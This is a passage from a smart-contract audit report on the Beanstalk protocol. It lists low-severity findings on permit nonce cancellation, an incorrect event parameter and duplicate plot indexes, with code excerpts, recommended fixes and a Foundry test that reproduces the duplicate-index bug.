It happens the same with the index, if a user has multiple plot indexes, an approved user can move whichever index he wants and at the start he wants.

## Impact

Low

## Tools Used

Manual review

## Recommendations

I would recommend to constrain the approval of plots by adding the index the user is approving the other user to move plots from. And also add the start index to completely determine which pods the approved user can move. That's because not all pods have the same value and should be constrained properly in order to give the user the full control of his pods.

## <a id='L-26'></a>L-26. Permit signatures cannot be cancelled by signers before deadline

_Submitted by [ZanyBonzy](https://profiles.cyfrin.io/u/undefined)._      
            


### Relevant GitHub Links

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Token/LibTokenPermit.sol#L59>

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Silo/LibSiloPermit.sol#L138>

## Summary

The `permit` signatures in LibSiloPermit.sol and LibTokenPermit.sol cannot be cancelled if the signer so wishes.

## Vulnerability Details

The `permit` signatures in LibSiloPermit.sol and LibTokenPermit.sol offers the signer the option to create a EIP-712 signature. After signing this signature, a signer might want to cancel it, but will not be able do so. This is because the function to increase nonce is not exposed and the `_useNonce` function is marked internal.

In LibTokenPermit.sol,

```solidity
    function _useNonce(address owner) internal returns (uint256 current) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        current = s.accts[owner].tokenPermitNonces;
        ++s.accts[owner].tokenPermitNonces;
    }
```

In LibSiloPermit.sol,

```solidity
    function _useNonce(address owner) internal returns (uint256 current) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        current = s.accts[owner].depositPermitNonces;
        ++s.accts[owner].depositPermitNonces;
    }
```

Similar [finding](https://solodit.xyz/issues/a-signer-cant-cancel-his-signature-before-a-deadline-cyfrin-none-cyfrin-farcaster-markdown) from Cyfrin team.

## Impact

Signers cannot cancel their signatures before its deadline.

## Tools Used

Manual Review.

## Recommendations

Introduce an external function like `IncreaseNonce` that will query `_useNonce` on behalf of `msg.sender`.

## <a id='L-27'></a>L-27. Incorrect event emission parameter in TransferBatch event, should use  LibTractor._user()  instead of msg.sender

_Submitted by [asefewwexa](https://profiles.cyfrin.io/u/undefined)._      
            


## Line of code

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Silo/LibSilo.sol#L635>

## Summary

the TransferBatch event emits the wrong address under certain conditions

## Vulnerability Details

```solidity
 event TransferBatch(
        address indexed operator,
        address indexed from,
        address indexed to,
        uint256[] ids,
        uint256[] values
    );
```

The transferBatch event is emitted but does not emit the correct address in case a call is executed via blueprint on behalf of the publisher.

```solidity
        if (emission == ERC1155Event.EMIT_BATCH_EVENT) {
            emit TransferBatch(msg.sender, account, address(0), removedDepositIDs, amounts);
        }
```

as we can see above, the msg.sender is the address that is emitted in the first parameter. But this is not true in all cases. To be more specific, during blue print execution a user is executing on behalf of a publisher, so having the msg sender be the first param of the event will be erroneous.

## Impact

When executing via blueprint the event will emit the incorrect address.

## Tools Used

manual reveiw

## Recommendations

instead of use msg.sender, the code needs to use LibTractor.\_user() to make sure the correct address operator is emitted in event emission if the call is executed during blueprint when the caller executes call onhalf of the publisher.

## <a id='L-28'></a>L-28. ## Duplicate Entries in plotIndexes via `FieldFacet.sow`

_Submitted by [ControlZ](https://profiles.cyfrin.io/u/undefined)._      
            


# Bean bug report

## Duplicate Entries in plotIndexes via `FieldFacet.sow`

### Description

The `plotIndexes` array is designed to contain unique plot indexes, ensuring that no index appears more than once. However, due to an oversight in the `sow` function in the `FieldFacet`, it is possible for multiple entries to have the same index.

## Root Cause

During the `sow` function call, the index is assigned as follows:

```js
    // LibDibbler.sol
    function sow(
      // ...
    ) internal returns (uint256) {
        // ...
        uint256 index = s.sys.fields[s.sys.activeField].pods;

        s.accts[account].fields[s.sys.activeField].plots[index] = pods;
        s.accts[account].fields[s.sys.activeField].plotIndexes.push(index); // here the index is pushed
        emit Sow(account, s.sys.activeField, index, beans, pods);

        s.sys.fields[s.sys.activeField].pods += pods;
        // ...
    }
```

Here, the index is determined by `s.sys.fields[s.sys.activeField].pods` and is later incremented by the newly sown `pods`. However, if `pods = 0`, `s.sys.fields[s.sys.activeField].pods` remains unchanged, causing the same index to be pushed into the `plotIndexes` array on subsequent sow calls.

## Impact

Functions utilizing the `plotIndexes` array will return incorrect values.
For example, `getPlotsFromAccount` will return the same plot multiple times.

Additionally, `removePlotIndexFromAccount` will only remove a single instance of the index, failing to perform correctly.

## Proposed fix

Include a requirement in the `sow` function to ensure that `pods > 0`:

```js
require(pods > 0, "Pods must be greater than 0");
```

## Proof of Concept

To reproduce the issue, add the following test to `protocol/test/foundry/field/Field.t.sol` and execute it using `forge test --match-test test_bug`:

```js
    function test_bug(uint256 soil) public {
        soil = bound(soil, 100, type(uint128).max);

        C.bean().mint(farmers[0], soil);

        _beforeEachSow(soil, soil / 2, false ? 1 : 0);
        vm.prank(farmers[0]);
        field.sow(0, 0, LibTransfer.From.EXTERNAL); // you can repeat this as much as wanted
        vm.prank(farmers[0]);
        field.sow(soil / 2, 0, LibTransfer.From.EXTERNAL);

        uint256 activeField = field.activeField();
        uint256[] memory plotIndexes = field.getPlotIndexesFromAccount(farmers[0], activeField);
        MockFieldFacet.Plot[] memory plots = field.getPlotsFromAccount(farmers[0], activeField);

        assertEq(plotIndexes.length, 3);
        assertEq(plotIndexes[1], plotIndexes[2]); // altough plot indexes sould be unique

        uint256 sumOfPlots = 0;
        for (uint256 i = 0; i < plots.length; ++i) {
            sumOfPlots += plots[i].pods;
        }
        assertGt(sumOfPlots, soil); // plots[1] and plots[2] are both pointing to the same plot!
    }
```





    
